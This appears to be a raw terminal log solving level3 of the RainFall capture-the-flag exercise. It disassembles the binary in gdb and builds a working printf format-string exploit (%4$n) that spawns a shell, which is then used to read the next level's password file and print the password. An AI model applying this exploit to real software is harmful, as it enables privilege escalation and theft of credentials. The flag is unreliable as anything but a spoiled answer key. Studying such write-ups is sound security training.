
level3@RainFall:~$ gdb level3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
---Type <return> to continue, or q <return> to quit---disas main
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
---Type <return> to continue, or q <return> to quit---
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
(gdb) r
Starting program: /home/user/level3/level3


[Inferior 1 (process 2565) exited normally]
(gdb) r
Starting program: /home/user/level3/level3
%p %p %p %p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025 0x70252070 0x20702520
[Inferior 1 (process 2568) exited normally]
(gdb) r
Starting program: /home/user/level3/level3
AAAA%p %p %p %p %p
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025
[Inferior 1 (process 2569) exited normally]
(gdb) x/s 0x804988c
0x804988c <m>:	 ""
(gdb) p/d 0x40
$1 = 64
(gdb) it compares the variable m to the value 64, we know printf pops values from the stack and the ffourth one is rewritable^CQuit
(gdb) so we put the address of m on the 4th value of the stack at the beginning oof our buffer that we tested with AAAA^CQuit
(gdb) that 4 bytes plus 60 A's will equal to 64, and the %n of printf writes the number of bytes written at the address given^CQuit
(gdb) when we use the x$ operator as an arg number, here the 4th one being the address of m we put^CQuit
(gdb) so %4$n will wwrite 64 at the address of the 4th arg, which we put the address of m in^CQuit
(gdb) r $(python -c 'print "\x8c\x98\x04\x08" +  "A" * 60 +  "%4$n"')
Starting program: /home/user/level3/level3 $(python -c 'print "\x8c\x98\x04\x08" +  "A" * 60 +  "%4$n"')


[Inferior 1 (process 2571) exited normally]
(gdb) q
level3@RainFall:~$ cat <(python -c 'print "\x8c\x98\x04\x08" +  "A" * 60 +  "%4$n"') | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
level3@RainFall:~$
level3@RainFall:~$ cat <(python -c 'print "\x8c\x98\x04\x08" +  "A" * 60 +  "%4$n"') - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!

whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
^C
level3@RainFall:~$ we needed to keep stdin open too^C